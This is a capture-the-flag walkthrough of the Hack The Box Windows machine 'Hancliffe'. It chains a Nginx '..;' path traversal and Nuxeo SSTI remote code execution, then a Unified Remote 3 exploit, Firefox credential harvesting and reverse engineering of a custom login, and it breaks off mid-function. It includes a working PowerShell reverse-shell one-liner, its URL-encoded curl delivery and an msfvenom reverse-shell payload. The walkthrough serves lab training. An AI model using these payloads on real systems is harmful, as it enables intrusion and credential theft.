# [hancliffe](https://app.hackthebox.com/machines/388)

> A Windows machine hosting [Nuxeo](https://github.com/nuxeo/nuxeo) 10.2 and [HashPass](https://github.com/scottparry/hashpass) behind an Nginx reverse proxy, along with a custom "Brankas" application. The reverse proxy is configured to restrict access to Nuxeo, but path normalization inconsistency between Nginx and the Java-based Nuxeo can be exploited to traverse the file system and interact with Nuxeo anyway. Nuxeo versions below 10.3 are vulnerable to [an unauthenticated server-side template injection (SSTI) vulnerability](https://github.com/mpgn/CVE-2018-16341) that leads to code execution and a shell as a low-privileged user. Another user is running [Unified Remote](https://www.unifiedremote.com/) version 3, which is listening on a `localhost` port. This version of Unified Remote also contains [a remote code execution vulnerability](https://www.exploit-db.com/exploits/49587), which can be exploited for a shell as the executing user. This user has their HashPass master password saved in Firefox, which leads to the generation of their development user account's password and access to it via WinRM. The development user account can read the "Brankas" application and exfiltrate it for offline analysis. It requires a particular credential to be used and this credential can be determined through reverse engineering. Once authenticated, it exposes a stack-based buffer overflow with only a limited amount of space to work with. The program's socket can be reused to stage additional shellcode which, once executed, grants a shell as `Administrator`.

---

## Open Port Enumeration

The target's TCP ports 80, 8000, and 9999 are open.

```bash
$ sudo masscan -p1-65535 10.129.96.116 --rate=1000 -e tun0 --output-format grepable --output-filename enum/hancliffe.masscan
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-12-03 18:46:11 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
$ cat enum/hancliffe.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
80,8000,9999,
```

Both ports 80 and 8000 are running Nginx 1.21.0.

```bash
$ sudo nmap -sC -sV -O -p80,8000,9999 10.129.96.116 -oA enum/hancliffe
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-03 13:50 EST
Nmap scan report for 10.129.96.116
Host is up (0.044s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.21.0
8000/tcp open  http    nginx 1.21.0
9999/tcp open  abyss?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, RPCCheck, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     Welcome Brankas Application.
|     Username: Password:
|   NULL:
|     Welcome Brankas Application.
|_    Username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.92%I=7%D=12/3%Time=61AA66FD%P=x86_64-pc-linux-gnu%r(NU
SF:LL,27,"Welcome\x20Brankas\x20Application\.\nUsername:\x20")%r(GetReques
SF:t,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")
SF:%r(HTTPOptions,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Pa
SF:ssword:\x20")%r(FourOhFourRequest,31,"Welcome\x20Brankas\x20Application
SF:\.\nUsername:\x20Password:\x20")%r(JavaRMI,31,"Welcome\x20Brankas\x20Ap
SF:plication\.\nUsername:\x20Password:\x20")%r(GenericLines,31,"Welcome\x2
SF:0Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(RTSPRequest,3
SF:1,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(
SF:RPCCheck,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password
SF::\x20")%r(DNSVersionBindReqTCP,31,"Welcome\x20Brankas\x20Application\.\
SF:nUsername:\x20Password:\x20")%r(DNSStatusRequestTCP,31,"Welcome\x20Bran
SF:kas\x20Application\.\nUsername:\x20Password:\x20")%r(Help,31,"Welcome\x
SF:20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(SSLSessionRe
SF:q,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")
SF:%r(TerminalServerCookie,31,"Welcome\x20Brankas\x20Application\.\nUserna
SF:me:\x20Password:\x20")%r(TLSSessionReq,31,"Welcome\x20Brankas\x20Applic
SF:ation\.\nUsername:\x20Password:\x20")%r(Kerberos,31,"Welcome\x20Brankas
SF:\x20Application\.\nUsername:\x20Password:\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|phone
Running: Linux 2.4.X|2.6.X, Sony Ericsson embedded
OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivaz
OS details: Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phone

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.81 seconds
```

---

## Port 80 Enumeration

Port 80's landing page is the default Nginx index page.

![](images/Pasted%20image%2020211203140324.png)

### Content Discovery

```bash
$ gobuster dir -u http://10.129.96.116 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.96.116
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/03 14:12:56 Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 612]
/maintenance          (Status: 302) [Size: 0] [--> /nuxeo/Maintenance/]
/Maintenance          (Status: 302) [Size: 0] [--> /nuxeo/Maintenance/]
/con                  (Status: 500) [Size: 494]

===============================================================
2021/12/03 14:15:59 Finished
===============================================================
```

The redirect to `/nuxeo/Maintenance/` is interesting. However, `/nuxeo/Maintenance/` returns a 404. [Nuxeo](https://github.com/nuxeo/nuxeo) is an "open source customizable and extensive content management platform for building business applications."

### Path Traversal

According to the Nuxeo repository, it is primarily written in Java. According to [Orange Tsai's DEFCON 26 talk](https://www.youtube.com/watch?v=28xWcRegncw), Nginx and Java-based web applications normalize paths differently, making it possible to traverse paths in the web application by inserting `..;`.

Since `/maintenance` was the only path that yielded anything useful, discover paths after `/maintenance/..;/`. This yields several paths that 302 redirect back to `/nuxeo/Maintenance/..;/*`, which result in 404s. It yields a successful request to `/maintenance/..;/login.jsp`.

```bash
$ feroxbuster -u 'http://10.129.174.204/maintenance/..;/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -x jsp

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.174.204/maintenance/..;/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [jsp]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
401      GET        4l       16w      222c http://10.129.174.204/maintenance/..;/user
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/search => /nuxeo/Maintenance/..;/search/
401      GET        4l       16w      222c http://10.129.174.204/maintenance/..;/login
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/scripts => /nuxeo/Maintenance/..;/scripts/
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/css => /nuxeo/Maintenance/..;/css/
200      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/js
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/index.jsp => http://10.129.174.204/nuxeo/nxstartup.faces
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/img => /nuxeo/Maintenance/..;/img/
401      GET        4l       16w      222c http://10.129.174.204/maintenance/..;/logout
500      GET      106l      269w     2396c http://10.129.174.204/maintenance/..;/api
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/pages => /nuxeo/Maintenance/..;/pages/
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/users => /nuxeo/Maintenance/..;/users/
401      GET        4l       16w      222c http://10.129.174.204/maintenance/..;/.xhtml
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/resources => /nuxeo/Maintenance/..;/resources/
401      GET        4l       16w      222c http://10.129.174.204/maintenance/..;/site
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/directory => /nuxeo/Maintenance/..;/directory/
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/ => http://10.129.174.204/nuxeo/nxstartup.faces
200      GET      450l      882w        0c http://10.129.174.204/maintenance/..;/login.jsp
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/icons => /nuxeo/Maintenance/..;/icons/
401      GET        4l       16w      222c http://10.129.174.204/maintenance/..;/group
401      GET        4l       16w      222c http://10.129.174.204/maintenance/..;/authentication
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/pagination => /nuxeo/Maintenance/..;/pagination/
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/widgets => /nuxeo/Maintenance/..;/widgets/
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/tinymce => /nuxeo/Maintenance/..;/tinymce/
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/layouts => /nuxeo/Maintenance/..;/layouts/
401      GET        4l       16w      222c http://10.129.174.204/maintenance/..;/webservices
401      GET        4l       16w      222c http://10.129.174.204/maintenance/..;/ws
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/analytics => /nuxeo/Maintenance/..;/analytics/
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/incl => /nuxeo/Maintenance/..;/incl/
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/ui => /nuxeo/Maintenance/..;/ui/
401      GET        4l       16w      222c http://10.129.174.204/maintenance/..;/viewer
200      GET       94l      272w     2456c http://10.129.174.204/maintenance/..;/page_not_found.jsp
401      GET        4l       16w      222c http://10.129.174.204/maintenance/..;/oauth
200      GET        1l        8w      105c http://10.129.174.204/maintenance/..;/.jsf
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/permissions => /nuxeo/Maintenance/..;/permissions/
401      GET        4l       16w      222c http://10.129.174.204/maintenance/..;/.seam
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/viewers => /nuxeo/Maintenance/..;/viewers/
401      GET        4l       16w      222c http://10.129.174.204/maintenance/..;/.faces
302      GET        0l        0w        0c http://10.129.174.204/maintenance/..;/jsf => /nuxeo/Maintenance/..;/jsf/
[####################] - 19m   112586/112586  0s      found:39      errors:3271
[####################] - 19m   112586/112586  98/s    http://10.129.174.204/maintenance/..;/
```

To interact with the web application effectively, configure BurpSuite to find and replace all instances of Nuxeo with `maintenance/..;` in the first line of the request.

![](images/Pasted%20image%2020220304133642.png)

Browse to `/nuxeo/login.jsp` for a login form.

![](images/Pasted%20image%2020220304133737.png)

---

## Port 8000 Enumeration

Port 8000 is serving HashPass, a stateless password manager by Scott Parry. The real life web application can be found [here](https://scottparry.co/labs/hashpass/) and the Github repository can be found [here](https://github.com/scottparry/hashpass).

![](images/Pasted%20image%2020211203142632.png)

### Content Discovery

```bash
$ gobuster dir -u http://10.129.96.116:8000 -w /usr/share/wordlists/SecLists/Discovery/Web repo.-Content/raft-small-words.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.96.116:8000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/03 14:17:03 Starting gobuster in directory enumeration mode
===============================================================
/includes             (Status: 301) [Size: 169] [--> http://10.129.96.116:8000/includes/]
/LICENSE              (Status: 200) [Size: 34501]
/assets               (Status: 301) [Size: 169] [--> http://10.129.96.116:8000/assets/]
/.                    (Status: 200) [Size: 7880]
/license              (Status: 200) [Size: 34501]
/Includes             (Status: 301) [Size: 169] [--> http://10.129.96.116:8000/Includes/]
/Assets               (Status: 301) [Size: 169] [--> http://10.129.96.116:8000/Assets/]
/con                  (Status: 500) [Size: 177]
/License              (Status: 200) [Size: 34501]
/INCLUDES             (Status: 301) [Size: 169] [--> http://10.129.96.116:8000/INCLUDES/]
/.gitignore           (Status: 200) [Size: 9]
/ASSETS               (Status: 301) [Size: 169] [--> http://10.129.96.116:8000/ASSETS/]

===============================================================
2021/12/03 14:20:05 Finished
===============================================================
```

### Manual Enumeration

The web page contains a description of the application's implementation.

![](images/Pasted%20image%2020211204220156.png)

Filling out and submitting the password generation form generates the following `POST` request to the server.

```http
POST / HTTP/1.1
Host: 10.129.96.116:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 128
Origin: http://10.129.96.116:8000
Connection: close
Referer: http://10.129.96.116:8000/
Upgrade-Insecure-Requests: 1

fullname=tgihf&website=hashpass.com&masterpassword=blahblah&length=16&counter=1&generatedpassword=%40qK1%5E3B%3APX3AWU%2B2*%235-
```

Looking at the source of the repo, there doesn't appear to be any glaring vulnerabilities. It appears the primary use of this application will be to generate some user's password given their secret key later on during the box. It appears port 80 will be the primary path forward.

---

## Port 9999 Enumeration

Port 9999 is serving an application that displays the banner `Welcome Brankas Application` and prompts for a username and password.

```bash
$ nc -nv 10.129.96.116 9999
(UNKNOWN) [10.129.96.116] 9999 (?) open
Welcome Brankas Application.
Username: tgihf
Password: blah
Username or Password incorrect
```

In real life, [Brankas](https://brank.as/about) is a financial technology company that focuses on southeast Asia.

---

## Nuxeo Unauthenticated RCE as `svc_account`

`Administrator`:`Administrator` on the login form doesn't yield access. However, there is an unauthenticated remote code execution [vulnerability](https://github.com/mpgn/CVE-2018-16341) in Nuxeo versions less than 10.3, and the login form source indicates it is version 10.2.

![](images/Pasted%20image%2020220304133932.png)

The vulnerability is an unauthenticated server-side template injection (SSTI) in the path of a nonexistent file. The following proof of concept attempts to retrieve `/login.jsp/pwn${-7+7}.xhtml`, which doesn't exist. The error message states that the file `/login.jsp/pwn0.xhtml` doesn't exist, indicating the `${-7+7}` template expression is being executed by the server.

```python
>>> import requests
>>> response = requests.get("http://hancliffe.htb/maintenance/..;/login.jsp/pwn${-7+7}.xhtml")
>>> response.text
'<span><span style="color:red;font-weight:bold;">ERROR: facelet not found at \'/login.jsp/pwn0.xhtml\'</span><br /></span>'
```

The SSTI vulnerability can be exploited for limited, blind command execution.

```txt
/maintenance/..;/login.jsp/pwn${\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"$COMMAND\",null).waitFor()}.xhtml
```

The context makes it seem impossible to stage a payload via HTTP or SMB. It also seems to error out if given any kind of string literal in the command, no matter the encoding. It is also really important to URL-encode the *entire* command.

To get around these restrictions, tweak the [Nishang reverse shell TCP one-liner](https://github.com/samratashok/nishang/edit/master/Shells/Invoke-PowerShellTcpOneLine.ps1) to take the attacking machine's IP address as a decimal number instead of a string literal.

```powershell
PS C:\Users\tgihf> ([System.Net.IpAddress]"10.10.14.97").Address
1628310026
PS C:\Users\tgihf> (New-Object System.Net.IpAddress(1628310026)).IPAddressToString
10.10.14.97
```

The payload:

```powershell
$ip=(New-Object Net.IPAddress(1628310026));$sm=(New-Object Net.Sockets.TCPClient($ip,443)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```

After URL-encoding the payload:

```bash
curl -i -s -k -X $'GET' \
    -H $'Host: hancliffe.htb' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: */*' -H $'Connection: close' \
    $'http://hancliffe.htb/maintenance/..;/login.jsp/pwn$%7B%22%22.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22powershell.exe%20-c%20%24%69%70%3d%28%4e%65%77%2d%4f%62%6a%65%63%74%20%4e%65%74%2e%49%50%41%64%64%72%65%73%73%28%31%36%32%38%33%31%30%30%32%36%29%29%3b%24%73%6d%3d%28%4e%65%77%2d%4f%62%6a%65%63%74%20%4e%65%74%2e%53%6f%63%6b%65%74%73%2e%54%43%50%43%6c%69%65%6e%74%28%24%69%70%2c%34%34%33%29%29%2e%47%65%74%53%74%72%65%61%6d%28%29%3b%5b%62%79%74%65%5b%5d%5d%24%62%74%3d%30%2e%2e%36%35%35%33%35%7c%25%7b%30%7d%3b%77%68%69%6c%65%28%28%24%69%3d%24%73%6d%2e%52%65%61%64%28%24%62%74%2c%30%2c%24%62%74%2e%4c%65%6e%67%74%68%29%29%20%2d%6e%65%20%30%29%7b%3b%24%64%3d%28%4e%65%77%2d%4f%62%6a%65%63%74%20%54%65%78%74%2e%41%53%43%49%49%45%6e%63%6f%64%69%6e%67%29%2e%47%65%74%53%74%72%69%6e%67%28%24%62%74%2c%30%2c%24%69%29%3b%24%73%74%3d%28%5b%74%65%78%74%2e%65%6e%63%6f%64%69%6e%67%5d%3a%3a%41%53%43%49%49%29%2e%47%65%74%42%79%74%65%73%28%28%69%65%78%20%24%64%20%32%3e%26%31%29%29%3b%24%73%6d%2e%57%72%69%74%65%28%24%73%74%2c%30%2c%24%73%74%2e%4c%65%6e%67%74%68%29%7d%22,null).waitFor()%7D.xhtml'
```

Receive a command shell as `svc_account`:

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.97] from (UNKNOWN) [10.129.174.204] 49560
whoami
hancliffe\svc_account
```

---

## Unified Remote 3 RCE as `clara`

[Unified Remote](https://www.unifiedremote.com/) version 3 is installed in `C:\Program Files (x86)\One Remote 3\`.

```batch
C:\Nuxeo>dir /a "C:\Program Files (x86)"
dir /a "C:\Program Files (x86)"
 Volume in drive C has no label.
 Volume Serial Number is B0F6-2F1B

 Directory of C:\Program Files (x86)

06/26/2021  09:15 PM    <DIR>          .
06/26/2021  09:15 PM    <DIR>          ..
06/03/2021  06:11 AM    <DIR>          Common Files
12/07/2019  01:12 AM               174 desktop.ini
10/03/2021  10:08 PM    <DIR>          Internet Explorer
06/03/2021  07:09 PM    <DIR>          Microsoft
12/07/2019  06:48 AM    <DIR>          Microsoft.NET
06/26/2021  09:15 PM    <DIR>          Mozilla Maintenance Service
06/12/2021  01:51 AM    <DIR>          MSBuild
06/12/2021  01:51 AM    <DIR>          Reference Assemblies
06/11/2021  11:21 PM    <DIR>          Unified Remote 3
04/09/2021  05:48 AM    <DIR>          Windows Defender
07/17/2021  11:20 PM    <DIR>          Windows Mail
12/07/2019  06:44 AM    <DIR>          Windows NT
04/09/2021  05:48 AM    <DIR>          Windows Photo Viewer
12/07/2019  01:25 AM    <DIR>          Windows Sidebar
12/07/2019  01:25 AM    <DIR>          WindowsPowerShell
               1 File(s)            174 bytes
              16 Dir(s)   5,567,115,264 bytes free
```

There exists a [remote code execution vulnerability](https://www.exploit-db.com/exploits/49587) in Unified Remote version 3. The exploit attempts to connect to port 9512, which is listening on the target, but firewall rules prevent external access.

```batch
c:\Nuxeo>netstat -ano | findstr 9512
netstat -ano | findstr 9512
  TCP    0.0.0.0:9512           0.0.0.0:0              LISTENING       7196
  UDP    0.0.0.0:9512           *:*                                    7196
```

The exploit requires the attacker to generate their own executable payload and serve it over HTTP. The exploit stages the executable and executes it.

Generate the payload. Since the program is sitting in `C:\Program Files (x86)\`, be sure to generate a 32-bit payload.

```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.97 LPORT=443 EXITFUNC=thread -f exe -o tgihf.exe                                             130 ⨯
/usr/lib/ruby/2.7.0/fileutils.rb:105: warning: already initialized constant FileUtils::VERSION
/var/lib/gems/2.7.0/gems/fileutils-1.6.0/lib/fileutils.rb:105: warning: previous definition of VERSION was here
/usr/lib/ruby/2.7.0/fileutils.rb:1284: warning: already initialized constant FileUtils::Entry_::S_IF_DOOR
/var/lib/gems/2.7.0/gems/fileutils-1.6.0/lib/fileutils.rb:1269: warning: previous definition of S_IF_DOOR was here
/usr/lib/ruby/2.7.0/fileutils.rb:1569: warning: already initialized constant FileUtils::Entry_::DIRECTORY_TERM
/var/lib/gems/2.7.0/gems/fileutils-1.6.0/lib/fileutils.rb:1557: warning: previous definition of DIRECTORY_TERM was here
/usr/lib/ruby/2.7.0/fileutils.rb:1627: warning: already initialized constant FileUtils::OPT_TABLE
/var/lib/gems/2.7.0/gems/fileutils-1.6.0/lib/fileutils.rb:1615: warning: previous definition of OPT_TABLE was here
/usr/lib/ruby/2.7.0/fileutils.rb:1686: warning: already initialized constant FileUtils::LOW_METHODS
/var/lib/gems/2.7.0/gems/fileutils-1.6.0/lib/fileutils.rb:1674: warning: previous definition of LOW_METHODS was here
/usr/lib/ruby/2.7.0/fileutils.rb:1693: warning: already initialized constant FileUtils::METHODS
/var/lib/gems/2.7.0/gems/fileutils-1.6.0/lib/fileutils.rb:1681: warning: previous definition of METHODS was here
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: tgihf.exe
```

Transfer the Windows 64-bit [chisel](https://github.com/jpillora/chisel) binary to the target and initiate a reverse port forward tunnel from the attacking machine's port 9512 to the target's `localhost`:9512.

```bash
$ ./chisel server --reverse --port 8001
2022/03/04 18:13:20 server: Reverse tunnelling enabled
2022/03/04 18:13:20 server: Fingerprint NUEIuQXqeAyEE1QOs+JPRejh8o1ZdPXeppbKlVAv7c0=
2022/03/04 18:13:20 server: Listening on http://0.0.0.0:8001
```

```batch
c:\nginx\www>.\chisel.exe client 10.10.14.97:8001 R:9512:localhost:9512
.\chisel.exe client 10.10.14.97:8001 R:9512:localhost:9512
2022/03/04 15:15:41 client: Connecting to ws://10.10.14.97:8001
2022/03/04 15:15:41 client: Connected (Latency 28.3237ms)
```

```bash
$ ./chisel server --reverse --port 8001
2022/03/04 18:13:20 server: Reverse tunnelling enabled
2022/03/04 18:13:20 server: Fingerprint NUEIuQXqeAyEE1QOs+JPRejh8o1ZdPXeppbKlVAv7c0=
2022/03/04 18:13:20 server: Listening on http://0.0.0.0:8001
2022/03/04 18:15:42 server: session#1: tun: proxy#R:9512=>localhost:9512: Listening
```

Serve the payload via HTTP.

```bash
$ ls tgihf.exe
tgihf.exe
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Run the payload through the reverse port forward tunnel.

```bash
$ python2.7 one-remote-3-exploit.py 127.0.0.1 10.10.14.97 tgihf.exe
[+] Connecting to target...
[+] Popping Start Menu
[+] Opening CMD
[+] *Super Fast Hacker Typing*
[+] Downloading Payload
[+] Done! Check listener?
```

Receive the reverse shell as `clara` and read the user flag at `C:\Users\clara\Desktop\user.txt`.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.97] from (UNKNOWN) [10.129.174.204] 49823
Microsoft Windows [Version 10.0.19043.1266]
(c) Microsoft Corporation. All rights reserved.

C:\Users\clara>whoami
whoami
hancliffe\clara

C:\Users\clara>dir Desktop\user.txt
dir Desktop\user.txt
 Volume in drive C has no label.
 Volume Serial Number is B0F6-2F1B

 Directory of C:\Users\clara\Desktop

03/04/2022  09:28 AM                34 user.txt
               1 File(s)             34 bytes
               0 Dir(s)   5,553,647,616 bytes free
```

---

## Lateral Movement to `development` Account

[winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) picks up a saved credential in Firefox. It appears to be the HashPass master key: `hancliffe.htb`:`#@H@ncLiff3D3velopm3ntM@st3rK3y*!`.

```txt
͹ Showing saved credentials for Firefox
     Url:           http://localhost:8000
     Username:      hancliffe.htb
     Password:      #@H@ncLiff3D3velopm3ntM@st3rK3y*!

   =================================================================================================


͹ Looking for Firefox DBs
  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Firefox credentials file exists at C:\Users\clara\AppData\Roaming\Mozilla\Firefox\Profiles\ljftf853.default-release\key4.db
 Run SharpWeb (https://github.com/djhohnstein/SharpWeb)
```

Use the full name `development`, website `hancliffe.htb`, and master password `#@H@ncLiff3D3velopm3ntM@st3rK3y*!` to generate the password `AMl.q2DHp?2.C/V0kNFU`.

![](images/Pasted%20image%2020220307102634.png)

Leveraging the dynamic reverse port forward tunnel, this password grants access as the `development` user via WinRM.

```bash
$ proxychains crackmapexec winrm 127.0.0.1 -d hancliffe -u development -p "AMl.q2DHp?2.C/V0kNFU"
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
WINRM       127.0.0.1       5985   127.0.0.1        [*] http://127.0.0.1:5985/wsman
WINRM       127.0.0.1       5985   127.0.0.1        [+] hancliffe\development:AMl.q2DHp?2.C/V0kNFU (Pwn3d!)
```

---

## Reverse Engineering Credentials from `MyFirstApp`

Unlike `svc_account` and `clara`, `development` has read access to `C:\DevApp\`.

```batch
c:\>icacls C:\DevApp
icacls C:\DevApp
C:\DevApp NT AUTHORITY\SYSTEM:(OI)(CI)(F)
          HANCLIFFE\development:(OI)(CI)(R)
          BUILTIN\Administrators:(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files
```

`C:\DevApp\` contains two files: `MyFirstApp.exe` and `restart.ps1`.

```batch
dc:\DevApp>ir
dir
 Volume in drive C has no label.
 Volume Serial Number is B0F6-2F1B

 Directory of c:\DevApp

09/14/2021  09:57 AM    <DIR>          .
09/14/2021  09:57 AM    <DIR>          ..
09/14/2021  04:02 AM            60,026 MyFirstApp.exe
09/14/2021  09:57 AM               636 restart.ps1
               2 File(s)         60,662 bytes
               2 Dir(s)   5,652,725,760 bytes free
```

`restart.ps1` ensures `MyFirstApp.exe` is restarted every 3 minutes. It also forwards `0.0.0.0`:9999 to whatever random port is being served by `MyFirstApp.exe`.

```powershell
# Restart app every 3 mins to avoid crashes
while($true) {
  # Delete existing forwards
  cmd /c "netsh interface portproxy delete v4tov4 listenport=9999 listenaddress=0.0.0.0"
  # Spawn app
  $proc = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList ("C:\DevApp\MyFirstApp.exe")
  sleep 2
  # Get random port
  $port = (Get-NetTCPConnection -OwningProcess $proc.ProcessId).LocalPort
  # Forward port to 9999
  cmd /c "netsh interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 connectport=$port connectaddress=127.0.0.1"
  sleep 180
  # Kill and repeat
  taskkill /f /t /im MyFirstApp.exe
}
```

Exfiltrate `MyFirstApp.exe` and begin reverse engineering it.

### `main`

`main` opens up a network socket listening on a random port and spawns a new thread to handle each inbound connection.

### `login`

`login` takes two parameters: `username` and `password`. `username` must be equal to the hardcoded `target_username`, `alfiansyah`.

`password` is more complicated. The first 17 bytes of `password` are passed as the second argument through the `encrypt1()` function, with the first argument as `0`. The result is then passed through the `encrypt2()` function. The result is base64-encoded. The result must be equal to the hardcoded `target_password`, `YXlYeDtsbD98eDtsWms5SyU=`.

If all this holds true, `login()` returns a 1. Otherwise, it returns a 0.

```c
undefined4 __cdecl _login(char *username,void *password)

{
  size_t len_double_encrypted_password;
  int is_username_valid;
  char password_buf [17];
  char *b64_double_encrypted_password;
  byte *double_encrypted_password;
  byte *alias_double_encrypted_password;
  size_t len_encrypted_password;
  char *encrypted_password;
  char *target_password;
  char *target_username;
  
  target_username = "alfiansyah";
  target_password = "YXlYeDtsbD98eDtsWms5SyU=";
  _memmove(password_buf,password,0x11);
  encrypted_password = _encrypt1(0,password_buf);
  len_encrypted_password = _strlen(encrypted_password);
  double_encrypted_password = (byte *)_encrypt2(encrypted_password,len_encrypted_password);
  alias_double_encrypted_password = double_encrypted_password;
  len_double_encrypted_password = _strlen((char *)double_encrypted_password);
  b64_double_encrypted_password =
       (char *)_b64_encode(double_encrypted_password,len_double_encrypted_password);
  is_username_valid = _strcmp(target_username,username);
  if ((is_username_valid == 0) &&
     (is_username_valid = _strcmp(target_password,b64_double_encrypted_password),
     is_username_valid == 0)) {
    return 1;
  }
  return 0;
}
```

Since the desired encrypted value of `password` is known (`YXlYeDtsbD98eDtsWms5SyU=`), if the decryption algorithms can be implemented properly, `YXlYeDtsbD98eDtsWms5SyU=` can be passed through them to generate the resultant plaintext password.

### `encrypt1`

`encrypt1(data)` works via the following algorithm: for every character in `data`that is in the printable ASCII range, if the character's byte value plus 0x2f is out of the printable ASCII range, replace the character with the character's byte value plus 0x2f - 0x5e (to keep it in the printable ASCII range). Else, replace it with the character's byte value plus 0x2f.

```c
char *decrypt1(char *encrypted_data) {
  char *data_buf = strdup(encrypted_data);
  unsigned int len_data_buf = strlen(data_buf);
  unsigned int i = 0;
  while (i < len_data_buf) {
    if ((int)data_buf[i] + 0x5e <= 173)
